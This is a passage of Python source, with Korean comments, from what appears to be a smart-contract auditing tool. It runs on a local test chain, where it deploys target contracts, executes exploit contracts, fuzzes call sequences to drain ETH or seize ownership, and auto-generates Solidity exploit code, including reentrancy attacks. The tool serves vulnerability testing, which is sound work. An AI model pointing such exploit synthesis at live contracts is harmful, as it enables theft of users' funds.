    try:
        solcx.set_solc_version(vs)
    except Exception:
        _ensure_solc(); vs = SOLC; ver = (0, 8, 24)
    evm = "cancun" if ver >= (0, 8, 24) else "istanbul"
    return vs, evm

def _coerce_args(args, Web3):
    out = []
    for a in args:
        if isinstance(a, (list, tuple)):
            out.append(_coerce_args(a, Web3))  # 배열 인자: 원소별 재귀 변환
        elif isinstance(a, str):
            if a.startswith("0x") and len(a) == 42:
                out.append(Web3.to_checksum_address(a))
            elif a.startswith("0x") and len(a) > 2:
                try: out.append(bytes.fromhex(a[2:]))   # bytes32 / bytesN / bytes
                except Exception: out.append(a)
            elif a.isdigit():
                out.append(int(a))
            else:
                out.append(a)
        else:
            out.append(a)
    return out

def _strip(src):
    src = re.sub(r"//[^\n]*", "", src)
    src = re.sub(r"/\*.*?\*/", "", src, flags=re.S)
    return src

def infer_target_name(src):
    # last top-level `contract X` that is not an interface; NaiveOracle-style files
    # put the main contract last.
    s = _strip(src)
    matches = re.findall(r"\bcontract\s+(\w+)", s)
    return matches[-1] if matches else None

_SKIP_TARGET_NAMES = {"Setup", "Invariants", "Test", "Script"}

def concrete_targets(src):
    """소스에 정의된, 분석 대상이 되는 구체 컨트랙트 이름들을 '취약해 보이는 순서'로 돌려준다.
    - 인터페이스/라이브러리/추상/스크립트 제외.
    - delegatecall/selfdestruct/.call{value}/receive/fallback 같은 위험 프리미티브가 많고,
      상태변경 external 함수가 많은 컨트랙트를 앞에 둔다(취약본을 먼저 시도해 빠르게 성립).
    라이브 콘솔이 '마지막 컨트랙트' 하나만 찍어 무해한 라이브러리를 겨냥하던 버그를 없앤다."""
    s = _strip_comments(src)
    try:
        bodies = _contract_bodies(s)
    except Exception:
        bodies = {}
    # 모든 구체 컨트랙트 이름을 먼저 모은다(참조 관계 판정용)
    all_names = [m.group(3) for m in re.finditer(r"(abstract\s+)?(contract|interface|library)\s+(\w+)", s)
                 if m.group(2) == "contract" and not m.group(1) and m.group(3) not in _SKIP_TARGET_NAMES]
    scored = []
    for m in re.finditer(r"(abstract\s+)?(contract|interface|library)\s+(\w+)", s):
        is_abstract, kind, name = m.group(1), m.group(2), m.group(3)
        if kind != "contract" or is_abstract or name in _SKIP_TARGET_NAMES:
            continue
        body = bodies.get(name, "")
        try:
            fns = _functions(body)
        except Exception:
            fns = []
        has_mut = any(f.get("external") and "view" not in f.get("head","") and "pure" not in f.get("head","") for f in fns)
        interesting = bool(re.search(r"\breceive\s*\(|\bfallback\s*\(|delegatecall|selfdestruct|\.call\s*\{\s*value", body))
        inert = (not fns) and (not re.search(r"\b(receive|fallback|payable)\b", body))
        if not (has_mut or interesting or inert):
            continue
        # 순위(높을수록 먼저): 위험 프리미티브 + 상태변경 함수 수 + '오케스트레이터' 보너스
        # (본문이 다른 후보를 참조하면 레벨 본체일 가능성이 높다 — Dex>Token, PuzzleWallet>proxy 등)
        danger = len(re.findall(r"delegatecall|selfdestruct|\.call\s*\{\s*value|\bcall\s*\(", body))
        mut_n = sum(1 for f in fns if f.get("external") and "view" not in f.get("head","") and "pure" not in f.get("head",""))
        orch = sum(1 for other in all_names if other != name and re.search(r"\b"+re.escape(other)+r"\b", body))
        idx = m.start()
        scored.append((-(danger*10 + mut_n + orch*20), idx, name))
    scored.sort()
    out = []
    for _rank, _idx, name in scored:
        if name not in out:
            out.append(name)
    return out

def infer_invariants_name(src):
    s = _strip(src)
    for m in re.finditer(r"\bcontract\s+(\w+)\s*(is[^\{]*)?\{", s):
        name = m.group(1)
        # crude: does this contract define checkAll?
        start = m.end()
        depth = 1; i = start
        while i < len(s) and depth > 0:
            if s[i] == "{": depth += 1
            elif s[i] == "}": depth -= 1
            i += 1
        body = s[start:i]
        if "checkAll" in body:
            return name
    m = re.findall(r"\bcontract\s+(\w+)", s)
    return m[-1] if m else None

def _default_manifest():
    return {"target": {"solc": SOLC, "evm_version": EVM_VERSION},
            "deploy": {"constructor_args": [], "value_wei": str(DEFAULT_SEED_WEI)},
            "invariants": {"predicates": []}}

def _flatten_sources(main_src, sources):
    """의존성 있는 컨트랙트를 단일 소스로 평탄화(flatten)한다. `sources` 는 {import경로:소스}
    맵(클라이언트가 웹에서 해결했거나 사용자가 첨부한 의존성). import/pragma/SPDX 를 제거하고
    의존성 → 메인 순서로 이어 붙이며, 최상위 정의(contract/interface/library/…)를 이름으로
    중복 제거한다. 하나의 pragma·SPDX 만 남긴다."""
    def _strip(s):
        s = re.sub(r"//\s*SPDX-License-Identifier:[^\n]*", "", s)
        s = re.sub(r"pragma\s+solidity[^;]*;", "", s)
        s = re.sub(r"pragma\s+abicoder[^;]*;", "", s)
        s = re.sub(r"pragma\s+experimental[^;]*;", "", s)
        s = re.sub(r"\bimport\b[^;]*;", "", s)   # import 문 전부 제거(한 줄 여러 개·비선두 포함)
        return s
    pm = re.search(r"pragma\s+solidity[^;]*;", main_src or "")
    pragma = pm.group(0) if pm else "pragma solidity ^0.8.20;"
    seen = set(); defs = []; loose = []   # defs: list of {name, bases, text}
    ordered = list((sources or {}).items()) + [("__main__", main_src)]
    pat = re.compile(r"(abstract\s+contract|contract|interface|library)\s+(\w+)([^{]*)")
    for _path, content in ordered:
        body = _strip(content or "")
        pos = 0
        while True:
            m = pat.search(body, pos)
            if not m:
                loose.append(body[pos:]); break
            loose.append(body[pos:m.start()])   # 정의 사이 file-scope 코드
            bi = body.find("{", m.end())
            if bi == -1:
                loose.append(body[m.start():]); break
            block = _extract_block(body, bi)
            full = body[m.start():bi] + "{" + block + "}"
            nm = m.group(2)
            # 상속 목록(is A, B(args), C) 에서 베이스 이름만 추출
            bases = []
            ism = re.search(r"\bis\b(.*)$", m.group(3), re.S)
            if ism:
                bases = re.findall(r"([A-Za-z_]\w*)\s*(?:\([^)]*\))?", ism.group(1))
            if nm not in seen:
                seen.add(nm); defs.append({"name": nm, "bases": bases, "text": full})
            pos = bi + 1 + len(block) + 1
    # 베이스가 파생보다 먼저 오도록 위상 정렬(solc: base must precede derived)
    by_name = {d["name"]: d for d in defs}
    out_order = []; done = set(); temp = set()
    def visit(d):
        if d["name"] in done or d["name"] in temp: return
        temp.add(d["name"])
        for b in d["bases"]:
            if b in by_name and b != d["name"]:
                visit(by_name[b])
        temp.discard(d["name"]); done.add(d["name"]); out_order.append(d)
    for d in defs:
        visit(d)
    header = "// SPDX-License-Identifier: MIT\n" + pragma + "\n\n"
    loose_txt = "\n".join(x for x in loose if x.strip())
    return header + (loose_txt + "\n\n" if loose_txt.strip() else "") + "\n\n".join(d["text"] for d in out_order) + "\n"

_DEPLOY_LEDGER = []   # 현재 EVM 세션에서 배포된 컨트랙트 주소 수집(스텝에 표시)

def _mk_evm():
    from web3 import Web3
    from eth_tester import EthereumTester, PyEVMBackend
    backend = PyEVMBackend.from_mnemonic(
        "test test test test test test test test test test test junk",
        genesis_state_overrides={"balance":10**24})
    w3 = Web3(Web3.EthereumTesterProvider(EthereumTester(backend=backend)))
    # 배포 주소 원장 초기화 + receipt 조회를 감싸서 contractAddress 를 모두 기록한다.
    # 모든 synth 가 이 헬퍼로 EVM 을 만들고 wait_for_transaction_receipt/get_transaction_receipt
    # 로 배포 receipt 를 받으므로, 여기 한 곳만 감싸면 배포 주소를 빠짐없이 모을 수 있다.
    global _DEPLOY_LEDGER
    _DEPLOY_LEDGER = []
    def _wrap(orig):
        def _tracked(*a, **k):
            r = orig(*a, **k)
            try:
                ca = None
                if hasattr(r, "contractAddress"): ca = r.contractAddress
                elif isinstance(r, dict): ca = r.get("contractAddress")
                if ca and ca not in _DEPLOY_LEDGER:
                    _DEPLOY_LEDGER.append(ca)
            except Exception:
                pass
            return r
        return _tracked
    for meth in ("wait_for_transaction_receipt", "get_transaction_receipt"):
        try:
            setattr(w3.eth, meth, _wrap(getattr(w3.eth, meth)))
        except Exception:
            pass
    return w3, w3.eth.accounts[0]

def _verify_attempt(name, target_src, invariants_src, exploit_src, manifest):
    """One EVM run of the harness _prove pipeline. Returns (proven, steps, meta)."""
    import solcx
    from web3 import Web3
    _solcv, _evm = _solc_for(target_src)
    inv_name = infer_invariants_name(invariants_src) or "Invariants"
    files = {f"{name}.sol":target_src, "Invariants_src.sol":invariants_src, "Exploit.sol":exploit_src}
    std = {"language":"Solidity","sources":{k:{"content":v} for k,v in files.items()},
           "settings":{"evmVersion":_evm,
                       "outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    compiled = solcx.compile_standard(std, allow_empty=True)
    arts = {}
    for _fn, cs in compiled.get("contracts",{}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi":c["abi"],"bin":c["evm"]["bytecode"]["object"]}
    for need in (name, inv_name, "Exploit"):
        if need not in arts:
            raise RuntimeError(f"missing artifact {need} (name mismatch)")
    w3, acct = _mk_evm()
    def deploy(art, args=None, value=0):
        C = w3.eth.contract(abi=art["abi"], bytecode=art["bin"])
        tx = C.constructor(*(args or [])).transact({"from":acct,"value":value,"gas":12_000_000})
        r = w3.eth.wait_for_transaction_receipt(tx)
        if r.contractAddress is None:
            raise RuntimeError("constructor reverted (non-payable ctor sent value, or out of gas)")
        return w3.eth.contract(address=r.contractAddress, abi=art["abi"]), r.contractAddress
    dep = manifest.get("deploy",{})
    cargs = _coerce_args(dep.get("constructor_args",[]), Web3)
    seed_wei = int(str(dep.get("value_wei", str(DEFAULT_SEED_WEI))) or "0")
    if not _ctor_payable(arts[name]["abi"]):
        seed_wei = 0  # 비-payable 생성자에 값 전송 금지(리버트 → contractAddress None)
    try:
        target, taddr = deploy(arts[name], cargs, value=seed_wei)
    except Exception:
        seed_wei = 0
        target, taddr = deploy(arts[name], cargs, value=0)
    inv, iaddr = deploy(arts[inv_name])
    before = inv.functions.checkAll(taddr).call()
    bal_before = w3.eth.get_balance(taddr)
    if before[0] is not True:
        return False, [{"step":"deploy_target","title":"타깃 배포 + 건강 검사","address":taddr,
                        "seed_wei":str(seed_wei),"balance_wei":str(bal_before),
                        "checkAll_before":{"allHold":before[0],"firstViolated":before[1]}}], {"bad_target":True}
    exp, eaddr = deploy(arts["Exploit"])
    w3.eth.send_transaction({"from":acct,"to":eaddr,"value":DEFAULT_EXPLOIT_FUNDING_WEI,"gas":1_000_000})
    run_err = None
    try:
        tx = exp.functions.run(taddr).transact({"from":acct,"value":DEFAULT_EXPLOIT_FUNDING_WEI,"gas":12_000_000})
        w3.eth.wait_for_transaction_receipt(tx)
    except Exception as e:
        run_err = str(e)[:200]
    after = inv.functions.checkAll(taddr).call()
    bal_after = w3.eth.get_balance(taddr)
    proven = after[0] is False
    steps = [
        {"step":"deploy_target","title":"타깃 배포 + 건강 검사","address":taddr,"seed_wei":str(seed_wei),
         "balance_wei":str(bal_before),"checkAll_before":{"allHold":before[0],"firstViolated":before[1]}},
        {"step":"run_exploit","title":"Exploit 배포 + 실행","exploit_address":eaddr,"run_error":run_err},
        {"step":"verify","title":"불변식 재검사","checkAll_after":{"allHold":after[0],"firstViolated":after[1]},
         "balance_wei":str(bal_after),"drained_wei":str(bal_before-bal_after),"proven":proven},
    ]
    meta = {"firstViolated":(after[1] if proven else ""),
            "balance_before_wei":str(bal_before),"balance_after_wei":str(bal_after)}
    return proven, steps, meta

def _has_getter(abi, name):
    for e in abi:
        if e.get("type")=="function" and e.get("name")==name and not e.get("inputs") \
           and e.get("stateMutability") in ("view","pure"):
            return True
    return False

def _ctor_payable(abi):
    """생성자가 payable 인지(값을 함께 보내도 되는지). 기본 생성자(ABI에 constructor
    엔트리 없음)는 payable 이 아니다."""
    for e in abi:
        if e.get("type") == "constructor":
            return e.get("stateMutability") == "payable"
    return False

def _run_effect(name, target_src, exploit_src, manifest):
    """No invariants supplied: actually deploy + run the exploit and OBSERVE effects
    (ETH drained, owner() hijacked, debt>collateral). Synthesizes the check in Python."""
    import solcx
    from web3 import Web3
    _solcv, _evm = _solc_for(target_src)
    files = {f"{name}.sol":target_src, "Exploit.sol":exploit_src}
    std = {"language":"Solidity","sources":{k:{"content":v} for k,v in files.items()},
           "settings":{"evmVersion":_evm,
                       "outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    compiled = solcx.compile_standard(std, allow_empty=True)
    arts = {}
    for _fn, cs in compiled.get("contracts",{}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi":c["abi"],"bin":c["evm"]["bytecode"]["object"]}
    if name not in arts or "Exploit" not in arts:
        raise RuntimeError(f"missing artifact ({name}/Exploit)")
    w3, acct = _mk_evm()
    def deploy(art, args=None, value=0):
        C = w3.eth.contract(abi=art["abi"], bytecode=art["bin"])
        tx = C.constructor(*(args or [])).transact({"from":acct,"value":value,"gas":12_000_000})
        r = w3.eth.wait_for_transaction_receipt(tx)
        if r.contractAddress is None:
            raise RuntimeError("constructor reverted (non-payable ctor sent value, or out of gas)")
        return w3.eth.contract(address=r.contractAddress, abi=art["abi"]), r.contractAddress
    dep = manifest.get("deploy",{})
    cargs = _coerce_args(dep.get("constructor_args",[]), Web3)
    seed_wei = int(str(dep.get("value_wei", str(DEFAULT_SEED_WEI))) or "0")
    if not _ctor_payable(arts[name]["abi"]):
        seed_wei = 0  # 비-payable 생성자에 값 전송 금지(리버트 → contractAddress None)
    try:
        target, taddr = deploy(arts[name], cargs, value=seed_wei)
    except Exception:
        seed_wei = 0
        target, taddr = deploy(arts[name], cargs, value=0)
    abi = arts[name]["abi"]
    tc = w3.eth.contract(address=taddr, abi=abi)
    # 타깃이 사용자 자금을 들고 있는 상황을 흉내: 생성자로 시드가 안 들어갔으면
    # 별도 '피해자' 계정에서 receive/fallback 로 시드를 밀어넣어 본다(가능할 때만).
    if seed_wei == 0:
        try:
            victim = w3.eth.accounts[-1]
            w3.eth.send_transaction({"from":victim,"to":taddr,"value":DEFAULT_SEED_WEI,"gas":200_000})
        except Exception:
            pass
    # pre-snapshot
    b0 = w3.eth.get_balance(taddr)
    o0 = tc.functions.owner().call() if _has_getter(abi,"owner") else None
    adm0 = tc.functions.admin().call() if _has_getter(abi,"admin") else None
    _bal_of = any(e.get("type")=="function" and e.get("name")=="balanceOf"
                  and [i["type"] for i in e.get("inputs",[])]==["address"]
                  and e.get("stateMutability") in ("view","pure") for e in abi)
    debt0 = tc.functions.totalDebt().call() if _has_getter(abi,"totalDebt") else None
    col0 = tc.functions.totalCollateral().call() if _has_getter(abi,"totalCollateral") else None
    steps=[{"step":"deploy_target","title":"타깃 배포 (불변식 자동 합성)","address":taddr,
            "seed_wei":str(seed_wei),"balance_wei":str(b0),
            "checkAll_before":{"allHold":True,"firstViolated":""}}]
    # deploy + run exploit
    exp, eaddr = deploy(arts["Exploit"])
    tb0 = tc.functions.balanceOf(eaddr).call() if _bal_of else 0
    w3.eth.send_transaction({"from":acct,"to":eaddr,"value":DEFAULT_EXPLOIT_FUNDING_WEI,"gas":1_000_000})
    run_err=None
    try:
        tx = exp.functions.run(taddr).transact({"from":acct,"value":DEFAULT_EXPLOIT_FUNDING_WEI,"gas":12_000_000})
        w3.eth.wait_for_transaction_receipt(tx)
    except Exception as e:
        run_err=str(e)[:200]
    steps.append({"step":"run_exploit","title":"Exploit 배포 + 실행","exploit_address":eaddr,"run_error":run_err})
    # post-snapshot + effect decision
    b1 = w3.eth.get_balance(taddr)
    o1 = tc.functions.owner().call() if _has_getter(abi,"owner") else None
    adm1 = tc.functions.admin().call() if _has_getter(abi,"admin") else None
    debt1 = tc.functions.totalDebt().call() if _has_getter(abi,"totalDebt") else None
    col1 = tc.functions.totalCollateral().call() if _has_getter(abi,"totalCollateral") else None
    reasons=[]
    if b1 < b0: reasons.append(f"funds drained ({(b0-b1)/1e18:g} ETH)")
    if o0 is not None and o1 is not None and o0 != o1: reasons.append("owner hijacked")
    if adm0 is not None and adm1 is not None and adm0 != adm1: reasons.append("admin hijacked")
    if debt1 is not None and col1 is not None and debt1 > col1: reasons.append("debt > collateral")
    if _bal_of and tc.functions.balanceOf(eaddr).call() > tb0 + 10**40:
        reasons.append("token balance inflated (overflow/underflow)")
    exploited = len(reasons) > 0
    if exploited and reasons and all("funds drained" in r for r in reasons):
        try:
            from trust404.intent import is_swap_only
            if is_swap_only(exploit_src):
                exploited = False
                reasons = ["intended_path: swap-only ETH movement"]
        except Exception:
            pass
    steps.append({"step":"verify","title":"효과 관찰 (자동 합성 불변식)",
                  "checkAll_after":{"allHold": not exploited,"firstViolated": ("; ".join(reasons) if exploited else "")},
                  "balance_wei":str(b1),"drained_wei":str(b0-b1),"proven":exploited})
    meta={"firstViolated":("; ".join(reasons) if exploited else ""),
          "balance_before_wei":str(b0),"balance_after_wei":str(b1)}
    return exploited, steps, meta

ZERO_ADDR = "0x0000000000000000000000000000000000000000"
_ATTACKER = "__ATTACKER__"; _TARGET = "__TARGET__"
import itertools as _it

def _fuzz_value_movers(target_src):
    """names of functions whose body actually moves ETH out (drain-like)."""
    movers=set()
    for fn in _functions(_strip(target_src)):
        b=fn["body"]
        if re.search(r"\.call\s*\{\s*value\s*:", b) or re.search(r"\.transfer\s*\(", b) or re.search(r"\.send\s*\(", b):
            movers.add(fn["name"])
    return movers

def _fuzz_fns(abi):
    out=[]
    for e in abi:
        if e.get("type")!="function": continue
        if e.get("stateMutability") in ("view","pure"): continue
        types=[i["type"] for i in e.get("inputs",[])]
        if any(not (t=="address" or t=="bool" or t.startswith("uint")) for t in types): continue
        out.append({"name":e["name"],"types":types,"payable":e.get("stateMutability")=="payable"})
    return out

def _fuzz_pool(t, ctx):
    lvl = ctx.get("pool_level", 0)
    if t.startswith("uint") or t.startswith("int"):
        base=[(1<<256)-1, ctx["seed"] or 10**19, 10**18, 1, 0]
        if lvl >= 1: base += [(1<<255), (1<<64), 2, 255, 256, 10**6]
        return base
    if t=="address":
        base=[_ATTACKER, ZERO_ADDR, _TARGET]
        if ctx.get("owner0"): base.append(ctx["owner0"])
        return base
    if t=="bool": return [True, False]
    if re.fullmatch(r"bytes\d+", t):
        n=int(t[5:]); v=("0x"+"ff"*n, "0x"+"00"*n)
        return list(v) if lvl >= 1 else [v[0]]
    return []

def _fuzz_calls(fn, ctx, cap=12):
    pools=[_fuzz_pool(t,ctx) for t in fn["types"]]
    if any(len(p)==0 for p in pools): return []
    cap = cap if ctx.get("pool_level",0) == 0 else cap*3
    combos=[()] if not fn["types"] else list(_it.product(*pools))[:cap]
    # payable 은 0 / 1 wei(임계 미만 게이트 통과용) / 1 ether 를 시도한다.
    vals=[0]+([1, 10**18] if fn["payable"] else [])
    return [{"name":fn["name"],"types":fn["types"],"args":list(c),"value":v} for c in combos for v in vals]

def _fuzz_resolve(a, acct, taddr, Web3):
    if a==_ATTACKER: return acct
    if a==_TARGET: return taddr
    if isinstance(a,str) and a.startswith("0x"): return Web3.to_checksum_address(a)
    return a

def _fuzz_lit(t, a):
    if t=="address":
        if a==_ATTACKER: return "address(this)"
        if a==_TARGET: return "t"
        if a==ZERO_ADDR: return "address(0)"
        return f"address({a})"
    if t=="bool": return "true" if a else "false"
    if a==(1<<256)-1: return "type(uint256).max"
    return str(a)

def _fuzz_codegen(seq, payable_map):
    sigs={}; calls=[]
    for c in seq:
        if c.get("raw"):  # receive/fallback 트리거
            if c.get("data"):  # 셀렉터 calldata → fallback→delegatecall
                calls.append(f"        (bool _ok,) = t.call(hex\"{c['data'][2:] if c['data'].startswith('0x') else c['data']}\"); _ok;  // {c.get('sel_of','')}()")
            else:
                calls.append(f"        (bool _ok,) = t.call{{value: {c['value']}}}(\"\"); _ok;")
            continue
        pay=" payable" if payable_map.get(c["name"]) else ""
        sigs[c["name"]]=f"    function {c['name']}({', '.join(c['types'])}) external{pay};"
        args=", ".join(_fuzz_lit(t,a) for t,a in zip(c["types"], c["args"]))
        val=f"{{value: {c['value']}}}" if c.get("value") else ""
        calls.append(f"        I(t).{c['name']}{val}({args});")
    return ("// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2;\n\n"
            "// Strategy: fuzzed call sequence (template-free) discovered by the agent.\n"
            "interface I {\n"+"\n".join(sigs.values())+"\n}\n\n"
            "contract Exploit {\n"
            "    function run(address t) external payable {\n"+"\n".join(calls)+"\n    }\n"
            "    receive() external payable {}\n}\n")

def _rw_vars(body):
    """함수 본문에서 쓰는(write)·읽는(read) 상태 식별자를 추출한다. 완벽한 데이터
    의존 분석은 아니지만, SliSE 류 슬라이싱의 저비용 근사로 시퀀스 우선순위에 쓴다."""
    writes = set(re.findall(r"\b(\w+)\s*(?:\[[^\]]*\])?\s*(?:=|\+=|-=)", body))
    reads = set(re.findall(r"\b([A-Za-z_]\w*)\b", body)) - writes
    return writes, reads


def _fuzz_search(name, target_src, invariants_src, manifest, do_verify, budget=None,
                 depth=2, pool_level=0, deadline=None):
    """Deploy target once, snapshot, search call sequences (single → pair → triple,
    depth-controlled) that trip the invariant/effect. pool_level enriches the input
    pools; deadline (epoch secs) bounds wall-clock. Returns (seq, payable_map, reason) or None.
    효과 판정은 배포 직후 건강 확인 기준의 실제 관찰이라 시퀀스를 더 깊이 파도 오탐이 없다."""
    import solcx
    from web3 import Web3
    if budget is None:
        try: budget = int(os.environ.get("TRUST404_FUZZ_BUDGET", "500"))
        except Exception: budget = 500
    def _time_left():
        return deadline is None or time.time() < deadline
    _solcv, _evm = _solc_for(target_src)
    files={f"{name}.sol":target_src}
    if do_verify and invariants_src: files["Invariants_src.sol"]=invariants_src
    std={"language":"Solidity","sources":{k:{"content":v} for k,v in files.items()},
         "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    compiled=solcx.compile_standard(std, allow_empty=True)
    arts={}
    for _fn,cs in compiled.get("contracts",{}).items():
        for cn,c in cs.items(): arts[cn]={"abi":c["abi"],"bin":c["evm"]["bytecode"]["object"]}
    if name not in arts: return None
    w3,acct=_mk_evm()
    # 타깃은 배포자(owner) 와 다른 계정에서 배포한다 — 공격자(acct)가 owner 로
    # 바뀌는 탈취(예: Ethernaut Fallback)를 owner() 변화로 탐지할 수 있게.
    accts = list(w3.eth.accounts)
    deployer = accts[1] if len(accts) > 1 else acct
    def deploy(art,args=None,value=0,frm=None):
        C=w3.eth.contract(abi=art["abi"],bytecode=art["bin"])
        tx=C.constructor(*(args or [])).transact({"from":frm or acct,"value":value,"gas":12_000_000})
        r=w3.eth.wait_for_transaction_receipt(tx)
        if r.contractAddress is None:
            raise RuntimeError("constructor reverted")
        return w3.eth.contract(address=r.contractAddress,abi=art["abi"]),r.contractAddress
    dep=manifest.get("deploy",{}); cargs=_coerce_args(dep.get("constructor_args",[]),Web3)
    seed_wei=int(str(dep.get("value_wei",str(DEFAULT_SEED_WEI))) or "0")
    if not _ctor_payable(arts[name]["abi"]):
        seed_wei=0
    try: tc,taddr=deploy(arts[name],cargs,value=seed_wei,frm=deployer)
    except Exception:
        seed_wei=0; tc,taddr=deploy(arts[name],cargs,value=0,frm=deployer)
    if seed_wei == 0:  # 피해자 자금 흉내 (receive/fallback 로 시드)
        try:
            victim = accts[-1]
            w3.eth.send_transaction({"from":victim,"to":taddr,"value":DEFAULT_SEED_WEI,"gas":200_000})
        except Exception:
            pass
    abi=arts[name]["abi"]
    inv=None
    if do_verify and invariants_src:
        inv_name=infer_invariants_name(invariants_src) or "Invariants"
        if inv_name not in arts: return None
        inv,_=deploy(arts[inv_name])
        if inv.functions.checkAll(taddr).call()[0] is not True: return None
    owner0 = tc.functions.owner().call() if _has_getter(abi,"owner") else None
    admin0 = tc.functions.admin().call() if _has_getter(abi,"admin") else None
    base_bal=w3.eth.get_balance(taddr)
    has_debt=_has_getter(abi,"totalDebt") and _has_getter(abi,"totalCollateral")
    # ERC20 잔액 인플레(언더플로 등) 탐지용 balanceOf(address)->uint 게터
    bal_of = any(e.get("type")=="function" and e.get("name")=="balanceOf"
                 and [i["type"] for i in e.get("inputs",[])]==["address"]
                 and e.get("stateMutability") in ("view","pure") for e in abi)
    tbal0 = tc.functions.balanceOf(acct).call() if bal_of else 0
    def checker():
        if inv is not None:
            r=inv.functions.checkAll(taddr).call()
            return (r[0] is False, r[1] if r[0] is False else "")
        reasons=[]
        if w3.eth.get_balance(taddr) < base_bal: reasons.append(f"funds drained ({(base_bal-w3.eth.get_balance(taddr))/1e18:g} ETH)")
        if owner0 is not None and tc.functions.owner().call()!=owner0: reasons.append("owner hijacked")
        if admin0 is not None and tc.functions.admin().call()!=admin0: reasons.append("admin hijacked")
        if has_debt and tc.functions.totalDebt().call() > tc.functions.totalCollateral().call(): reasons.append("debt > collateral")
        if bal_of and tc.functions.balanceOf(acct).call() > tbal0 + 10**40:
            reasons.append("token balance inflated (overflow/underflow)")
        return (len(reasons)>0, "; ".join(reasons))
    tester=w3.provider.ethereum_tester; snap=tester.take_snapshot()
    ctx={"seed":seed_wei,"attacker":acct,"target":taddr,"owner0":owner0,"pool_level":pool_level}
    fns=_fuzz_fns(abi)
    payable_map={f["name"]:f["payable"] for f in fns}
    movers=_fuzz_value_movers(target_src)
    calls_by_fn={f["name"]:_fuzz_calls(f,ctx) for f in fns}
    all_calls=[c for f in fns for c in calls_by_fn[f["name"]]]
    # 원시 ETH 전송(receive/fallback 로직 트리거) 도 시퀀스 요소로 포함한다 —
    # Ethernaut Fallback 류(직접 송금으로 owner 탈취)를 잡기 위함.
    raw_calls=[{"name":"__raw_send__","types":[],"args":[],"value":v,"raw":True} for v in (1, 10**15 - 1, 10**18)]
    # 프록시 fallback→delegatecall 대응: 소스의 모든 무인자 함수 셀렉터를 raw calldata
    # 로 타깃에 보내 fallback 을 통해 delegatecall 이 실행되게 한다(Ethernaut Delegation).
    if re.search(r"\bfallback\s*\(|delegatecall", target_src):
        seen=set()
        for f in _functions(_strip(target_src)):
            if not f["args"] and f["name"] and f["name"] not in seen:
                seen.add(f["name"])
                sel = Web3.keccak(text=f"{f['name']}()")[:4].hex()
                raw_calls.append({"name":"__raw_data__","types":[],"args":[],"value":0,
                                  "raw":True,"data":sel,"sel_of":f["name"]})
    all_calls = all_calls + raw_calls
    # ── SliSE 류 슬라이싱 근사: 값-이동/권한 함수(sink)가 읽는 상태를 쓰는 함수
    # (setup)를 먼저 시도하도록 all_calls 를 우선순위화한다(데이터 의존 기반). ──
    src_fns = {f["name"]: f for f in _functions(_strip(target_src))}
    rw = {n: _rw_vars(f["body"]) for n, f in src_fns.items()}
    sink_reads = set()
    for n, (w, rd) in rw.items():
        if n in movers or re.search(r"\bowner\b|\badmin\b", " ".join(rw[n][0])):
            sink_reads |= rd
    def _prio(c):
        if c.get("raw"):
            return 1  # receive/fallback 트리거는 중간 우선순위
        w = rw.get(c["name"], (set(), set()))[0]
        return 2 if (w & sink_reads) else 0  # sink 가 읽는 상태를 쓰면 먼저
    all_calls.sort(key=_prio, reverse=True)
    def do_call(c):
        if c.get("raw"):
            tx={"from":acct,"to":taddr,"value":c["value"],"gas":300_000}
            if c.get("data"): tx["data"]=c["data"]
            w3.eth.send_transaction(tx); return
        args=[_fuzz_resolve(a,acct,taddr,Web3) for a in c["args"]]
        getattr(tc.functions,c["name"])(*args).transact({"from":acct,"value":c["value"],"gas":8_000_000})
    b=0
    # phase 1: single calls
    for c in all_calls:
        if b>=budget or not _time_left(): break
        b+=1; tester.revert_to_snapshot(snap)
        try: do_call(c)
        except Exception: pass
        trip,reason=checker()
        if trip: return [c], payable_map, reason
    if depth < 2:
        return None
    # phase 2: setup(any) -> drain/hijack (value-mover 또는 raw send)
    seconds=[c for c in all_calls if c.get("raw") or c["name"] in movers] or all_calls
    for c1 in all_calls:
        if b>=budget or not _time_left(): break
        for c2 in seconds:
            if b>=budget or not _time_left(): break
            b+=1; tester.revert_to_snapshot(snap)
            try: do_call(c1)
            except Exception: continue
            try: do_call(c2)
            except Exception: pass
            trip,reason=checker()
            if trip: return [c1,c2], payable_map, reason
    if depth < 3:
        return None
    # phase 3: setup -> setup -> drain/hijack (3단계 시퀀스; 우선순위 상위만)
    firsts = all_calls[:max(8, len(all_calls)//3)]
    for c1 in firsts:
        if b>=budget or not _time_left(): break
        for c2 in firsts:
            if b>=budget or not _time_left(): break
            for c3 in seconds:
                if b>=budget or not _time_left(): break
                b+=1; tester.revert_to_snapshot(snap)
                try: do_call(c1)
                except Exception: continue
                try: do_call(c2)
                except Exception: pass
                try: do_call(c3)
                except Exception: pass
                trip,reason=checker()
                if trip: return [c1,c2,c3], payable_map, reason
    return None

def _synth_reentrancy(target_src):
    """소스에서 (payable 예치, ETH를 되돌려주는 인출) 함수 쌍을 열거해, 악성
    receive() 로 인출을 재진입하는 공격 컨트랙트를 합성한다. 스캐너가 재진입
    계열을 스코어링하지 못한 경우에도 퍼저가 재진입을 직접 성립시키는 경로."""
    from trust404.scan import _reentrancy_vulnerable

    src = _strip_comments(target_src)
    fns = _functions(src)
    deposits, withdraws = [], []
    for f in fns:
        if not f.get("external"):
            continue
        b = f["body"]
        # 예치 후보: payable 이고 어떤 원장에 msg.value 를 적립한다. msg.sender 에게
        # 적립하면 무인자 호출, address 인자에게 적립하면 그 인자에 address(this).
        if f["payable"] and re.search(r"\w+\[[^\]]+\]\s*(?:\+=|=)[^;]*msg\.value", b):
            credits_sender = bool(re.search(r"\w+\[\s*msg\.sender\s*\]\s*(?:\+=|=)[^;]*msg\.value", b))
            addr_args = [an for (t, an) in f["args"] if t == "address"]
            if credits_sender and not f["args"]:
                deposits.append({"fn": f, "form": "self"})
            elif addr_args:
                deposits.append({"fn": f, "form": "addr"})
            elif credits_sender:
                deposits.append({"fn": f, "form": "self"})
        # 인출 후보: 값을 보내는 external 함수 (수신자·금액 표현식 무관). 무인자 또는 uint 1개.
        if _reentrancy_vulnerable(f, src):
            if len(f["args"]) == 0 or (len(f["args"]) == 1 and f["args"][0][0].startswith("uint")):
                withdraws.append(f)
    out = []
    for dep in deposits[:3]:
        depfn = dep["fn"]
